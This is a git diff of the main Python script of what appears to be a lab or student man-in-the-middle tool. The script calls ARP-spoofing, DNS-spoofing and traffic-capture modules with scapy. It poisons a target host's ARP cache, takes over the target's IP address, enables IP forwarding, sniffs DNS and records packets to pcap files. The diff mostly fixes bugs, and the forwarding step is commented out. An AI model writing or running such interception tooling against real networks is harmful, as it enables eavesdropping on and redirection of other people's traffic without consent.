@@ -6,11 +6,13 @@ import admin
 import os
 from threading import Thread
 import scapy.all as scapy
+import multiprocessing
 
 import ARP_Spoofing
 import Change_IP_Address
-import NetworkDiscovery
-from DNS_Spoofing
+import Network_Discovery
+import DNS_Spoofing
+import Traffic_Forwarder
 
 def Main():
     #IP = NetFunctions.get_ip()
@@ -20,19 +22,19 @@ def Main():
     #    print("invalid IP Address")
     #    sys.exit()
 
-    IP = '192.168.0.100' #predifined variable values for testing purposes
-    Mac = NetworkDiscovery.get_mac_by_ip_SELF(IP)
+    IP = '192.168.42.129' #predifined variable values for testing purposes
+    Mac = Network_Discovery.get_mac_by_ip_SELF(IP)
     MASK = "255.255.255.0"
-    Target = "192.168.0.1"
-    TargetMac = NetworkDiscovery.get_mac_by_ip(Target, IP)
-    Interface = NetworkDiscovery.get_interface_from_ip(IP)
+    Target = "192.168.42.130"
+    TargetMac = Network_Discovery.get_mac_by_ip(Target, IP)
+    Interface = Network_Discovery.get_interface_from_ip(IP)
 
-    if len(IP.split()) != 4:
+    if len(IP.split(".")) != 4:
         print("IP Address invalid, check format")
         sys.exit()
 
-    for num in IP.split():
-        if (num > 255 or num <= -1 or not (num.int)):
+    for num in IP.split("."):
+        if (not (num.isnumeric()) or int(num) > 255 or int(num) <= -1):
             print("IP Address invalid, check format")
             sys.exit()
 
@@ -45,7 +47,7 @@ def Main():
     #gw = scapy.conf.route.route("0.0.0.0")[2]
 
     #starts new thread to run the function that gathers the Network traffic
-    t1 = threading.Thread(target=NetworkDiscovery.NetCap, args=("test.pcap", NetworkDiscovery.get_interface_from_ip(IP)))
+    t1 = multiprocessing.Process(target=Network_Discovery.NetCap, args=("test.pcap", Network_Discovery.get_interface_from_ip(IP)))
     t1.start()
 
     try:
@@ -63,40 +65,54 @@ def Main():
     IfIPChange=False
 
     if Target in nm.all_hosts():
+        t2 = multiprocessing.Process(target=ARP_Spoofing.spoof, args=(Target, IP, TargetMac, Mac))
+        t2.start()
+
         if(IfIPChange==False):
             try:
+                print("Attempting to change IP Address")
                 t2.terminate()
-                NetworkDiscovery.changeIPAddress(Interface, Target, MASK)
+                t1.terminate()
+
+                Change_IP_Address.changeIPAddress(Interface, Target, MASK)
                 IfIPChange=True
+
+                t2 = multiprocessing.Process(target=ARP_Spoofing.spoof, args=(Target, IP, TargetMac, Mac))
+                t2.start()
+
+                t1 = multiprocessing.Process(target=Network_Discovery.NetCap, args=("test1.pcap", Network_Discovery.get_interface_from_ip(IP)))
+                t1.start()
 
                 print("IP Address successfully Changed")
 
-                t1 = Thread(target=NetworkDiscovery.NetCap, args=("test.pcap", NetworkDiscovery.get_interface_from_ip(IP)))
-                t1.start()
-
-                t2 = Thread(target=ARP_Spoofing.spoof, args=(Target, IP, TargetMac, Mac))
+            except Exception as e:
+                print(f"IP Address change failed {e}")
+                Change_IP_Address.changeIPAddress(Interface, IP, MASK)
+                t2 = multiprocessing.Process(target=ARP_Spoofing.spoof, args=(Target, IP, TargetMac, Mac))
                 t2.start()
 
-            except:
+                t1 = multiprocessing.Process(target=Network_Discovery.NetCap, args=("test1.pcap", Network_Discovery.get_interface_from_ip(IP)))
+                t1.start()
                 IfIPChange=False
 
         if (os.name != 'nt'):
             ARP_Spoofing.enable_ip_forwarding()
 
-        NetworkDiscovery.start_sniffing("8.8.8.8", Interface)
+        DNS_Spoofing.start_sniffing("8.8.8.8", Interface)
 
         try:
-            scapy.sniff(filter=f"ip.dst == {host}", 
-            prn=lambda packet: '"FUNCTION TO SWITCH DESTINATION TO PROPER ADDRESSES"'(packet, Interface),
-            iface=Interface)
+            True
+            # scapy.sniff(filter=f"ip.dst == {host}", 
+            # prn=lambda packet: Traffic_Forwarder.Host(packet, Interface),
+            # iface=Interface)
 
-            scapy.sniff(filter=f"ip.dst == {Target}", 
-            prn=lambda packet: '"FUNCTION TO SWITCH DESTINATION TO PROPER ADDRESSES"'(packet, Interface),
-            iface=Interface)
+            # scapy.sniff(filter=f"ip.dst == {Target}", 
+            # prn=lambda packet: Traffic_Forwarder.Target(packet, Interface),
+            # iface=Interface)
 
         except KeyboardInterrupt: #closes on keyboard interupt
             print("Keyboard Interupt")
-            ARP_Spoofing.spoof(Target, IP)(IP, Target, Mac, TargetMac)
+            ARP_Spoofing.spoof(IP, Target, Mac, TargetMac)
             Change_IP_Address.changeIPAddress(Interface, IP, MASK)
             ARP_Spoofing.disable_ip_forwarding()
             t2.join()
@@ -104,7 +120,7 @@ def Main():
             sys.exit()
         except Exception as e: #closes on exception
             print(f"Arp spoofing failed: {e}")
-            ARP_Spoofing.spoof(Target, IP)(IP, Target, Mac, TargetMac)
+            ARP_Spoofing.spoof(IP, Target, Mac, TargetMac)
             Change_IP_Address.changeIPAddress(Interface, IP, MASK)
             ARP_Spoofing.disable_ip_forwarding()
             t2.join()
